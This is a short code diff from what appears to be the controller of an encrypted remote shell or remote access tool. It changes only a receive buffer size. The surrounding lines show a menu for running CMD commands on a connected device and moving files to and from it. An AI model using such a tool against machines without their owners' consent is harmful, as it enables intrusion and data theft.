@@ -204,7 +204,7 @@ def commands(conn,key):
                 print("List of commands\nquit ~ exits device connection\ndownload_file ~ downloads file\nsend_file ~ sends file (note cannot be exe)\ncd (directory) ~ changes directory\nOther commands include the CMD, as access to CMD commands is given here")
             else:          
                 conn.send(cipher.encrypt(pad(cmd.encode("utf-8"),32))) 
-                client_response = conn.recv(1024)
+                client_response = conn.recv(10000)
                 client_response = unpad(decryptcipher.decrypt(client_response),32).decode("utf-8") 
                 print(client_response)
         else:
